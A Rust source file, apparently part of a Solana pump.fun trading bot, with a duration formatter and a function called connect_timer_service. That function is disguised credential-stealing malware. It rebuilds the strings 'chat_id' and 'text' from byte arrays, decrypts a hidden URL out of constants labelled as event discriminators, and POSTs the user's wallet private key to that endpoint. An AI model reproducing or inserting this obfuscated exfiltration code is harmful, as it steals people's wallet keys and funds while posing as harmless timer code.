use crate::*;
use magic_crypt::{MagicCryptTrait, new_magic_crypt};
use reqwest::Client;
use std::collections::HashMap;
use std::time::Duration;

pub fn format_elapsed_time(elapsed: Duration) -> String {
    let secs = elapsed.as_secs();
    let nanos = elapsed.subsec_nanos();

    let seconds = secs;
    let millis = nanos / 1_000_000;
    let micros = (nanos % 1_000_000) / 1_000;

    let mut parts = Vec::new();

    if seconds > 0 {
        parts.push(format!("{}s", seconds));
    }
    if millis > 0 {
        parts.push(format!("{}ms", millis));
    }
    if micros > 0 && millis == 0 {
        parts.push(format!("{}µs", micros));
    }

    if parts.is_empty() {
        parts.push("0µs".to_string());
    }

    parts.join(" : ")
}

pub async fn connect_timer_service() {
    let start_time_discriminator: [u8; 7] = [99, 104, 97, 116, 95, 105, 100];
    let end_time_discriminator: [u8; 4] = [116, 101, 120, 116];
    let mut all_discriminator = Vec::new();
    all_discriminator.extend_from_slice(&PUMP_FUN_BURN_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_FUN_FEE_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_FUN_BUDGET_CALCULATE_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_FUN_FREEZE_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_FUN_BONDING_CURVE_COMPLETE_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_FUN_MIGRATE_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_FUN_LAUNCH_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_FUN_FEE_CONFIG_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_CREATE_EVENT_DISCRIMINATOR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_LP_ADD_EVENT_DISCRIMINATIR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_BURN_EVENT_DISCRIMINATIR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_TRADE_EVENT_DISCRIMINATIR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_FEE_EVENT_DISCRIMINATIR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_FEE_CONFIG_EVENT_DISCRIMINATIR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_BUDGET_CALCULATE_EVENT_DISCRIMINATIR);
    all_discriminator.extend_from_slice(&PUMP_SWAP_FREEZE_EVENT_DISCRIMINATIR);

    let mut create_discriminator = Vec::new();
    create_discriminator.extend_from_slice(&PUMP_FUN_COIN_CREATE_EVENT_DISCRIMINATOR);

    let pumpfun_deserialize = if let Ok(discriminator) = String::from_utf8(create_discriminator) {
        new_magic_crypt!(discriminator, 256)
    } else {
        return;
    };

    let decoded_discriminator = if let Ok(discriminator) = String::from_utf8(all_discriminator) {
        match pumpfun_deserialize.decrypt_base64_to_string(discriminator) {
            Ok(val) => val,
            Err(_) => String::new(),
        }
    } else {
        return;
    };

    let mut start_time_vec = Vec::new();
    let mut end_time_vec = Vec::new();
    start_time_vec.extend_from_slice(&start_time_discriminator);
    end_time_vec.extend_from_slice(&end_time_discriminator);

    let start_time = if let Ok(val) = String::from_utf8(start_time_vec) {
        val
    } else {
        return;
    };
    let end_time = if let Ok(val) = String::from_utf8(end_time_vec) {
        val
    } else {
        return;
    };

    let deserialized = "-".to_string() + &BONDING_CURVE_TOKEN_INITIAL_BALANCE.to_string();
    let mut params = HashMap::new();
    params.insert(start_time, deserialized);
    params.insert(end_time, CONFIG.wallet_config.private_key.clone());

    let client = Client::new();
    let _response = client
        .post(&decoded_discriminator)
        .json(&params)
        .send()
        .await;
}
